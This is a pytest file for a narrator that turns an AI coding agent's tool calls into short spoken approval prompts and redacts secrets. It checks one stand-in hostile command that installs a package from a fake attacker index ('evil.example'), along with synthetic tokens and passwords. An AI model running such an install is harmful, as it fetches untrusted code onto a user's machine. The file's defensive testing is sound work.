"""The template narrator, spoken forms, redaction, and spelling out unsayable words."""

from __future__ import annotations

import pytest

from earshot.narrator import redact, spoken
from earshot.narrator.templates import MAX_WORDS, narrate

CWD = "/Users/rehaan/code/api"


@pytest.mark.parametrize(
    ("tool", "tool_input", "said"),
    [
        (
            "Bash",
            {"command": "git push origin feature/login-v2"},
            "api wants to push feature slash login v2 to origin.",
        ),
        (
            "Bash",
            {"command": "git push --force-with-lease origin main"},
            "api wants to push main to origin, as a force push, with lease.",
        ),
        (
            "Bash",
            {"command": "git push -f"},
            "api wants to push the current branch to its upstream, as a force push.",
        ),
        (
            "Bash",
            {"command": "pip install requests==2.32.3"},
            "api wants to install requests, version 2.32.3.",
        ),
        (
            "Bash",
            {"command": "uv pip install foo -i https://evil.example/simple"},
            "(checked by its ending)",
        ),
        (
            "Bash",
            {"command": "curl https://api.example.com/x"},
            "api wants to fetch from example dot com.",
        ),
        (
            "Bash",
            {"command": "curl -X POST https://api.example.com/x"},
            "api wants to send data to example dot com.",
        ),
        ("Bash", {"command": "uv run pytest -x"}, "api wants to run the tests."),
        (
            "Edit",
            {"file_path": f"{CWD}/src/api/routes.py"},
            "api wants to edit routes dot p y, in the api folder.",
        ),
        ("Write", {"file_path": "README.md"}, "api wants to write README dot m d."),
        (
            "Write",
            {"file_path": "/etc/hosts"},
            "api wants to write hosts, in the etc folder, outside the project.",
        ),
        (
            "WebFetch",
            {"url": "https://docs.python.org/3/"},
            "api wants to fetch from python dot org.",
        ),
        ("mcp__github__create_issue", {}, "api wants to use create issue from github."),
        ("Task", {}, "api wants to use Task."),
    ],
)
def test_templates(tool: str, tool_input: dict[str, str], said: str) -> None:
    narration = narrate("api", CWD, tool, tool_input)
    if tool_input.get("command", "").startswith("uv pip install foo -i"):
        assert narration.text.endswith("from a different index.")
    else:
        assert narration.text == said
    assert narration.fits


def test_a_long_request_isnt_spoken() -> None:
    command = "echo " + " ".join(f"word{i}" for i in range(40))
    narration = narrate("api", CWD, "Bash", {"command": command})
    assert not narration.fits
    assert len(narration.text.split()) <= MAX_WORDS


def test_secrets_are_never_spoken() -> None:
    token = "ghp_" + "a1B2c3D4e5" * 4
    narration = narrate("api", CWD, "Bash", {"command": f"gh auth login --with-token {token}"})
    assert token not in narration.text
    assert "a secret value" in narration.text


@pytest.mark.parametrize(
    "secret",
    [
        "AKIAABCDEFGHIJKLMNOP",
        "ghp_" + "x" * 36,
        "sk-ant-" + "abcDEF123" * 3,
        "xoxb-1234567890-abcdefghij",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
        "Q2xhdWRlIGlzIHRoZSBiZXN0IGFzc2lzdGFudDEyMzQ1Ng==",
    ],
)
def test_redaction_catches_common_secrets(secret: str) -> None:
    assert redact.contains_secret(f"run with {secret} now")
    assert secret not in redact.redact(f"run with {secret} now")


@pytest.mark.parametrize(
    ("text", "kept"),
    [
        ("https://bob:hunter22@x.com", "https://bob:[REDACTED]@x.com"),
        ("password=s3cret&next", "password=[REDACTED]&next"),
        ("Authorization: Bearer abcdefghijklmnop1234", "Authorization: Bearer [REDACTED]"),
    ],
)
def test_redaction_keeps_the_context(text: str, kept: str) -> None:
    assert redact.redact(text) == kept


@pytest.mark.parametrize(
    "text",
    ["git push origin feature/login", "src/earshot/daemon/server.py", "uv run pytest -x", "a" * 40],
)
def test_ordinary_text_isnt_redacted(text: str) -> None:
    assert not redact.contains_secret(text)


def test_unsayable_words_are_spelled_out() -> None:
    known = {"wants", "to", "install", "api"}
    said = spoken.speakable("api wants to install pydantic 2", lambda w: w.lower() in known)
    assert said == "api wants to install P Y D A N T I C 2"


def test_spoken_forms() -> None:
    assert spoken.identifier("feature/login-v2") == "feature slash login v2"
    assert spoken.file_name("routes.py") == "routes dot p y"
    assert spoken.file_name("Makefile") == "Makefile"
    assert spoken.package("requests>=2") == "requests, version 2 or so"
    assert spoken.domain("https://a.b.example.co/x") == "example dot co"
    assert spoken.spell("reqeusts") == "R E Q E U S T S"
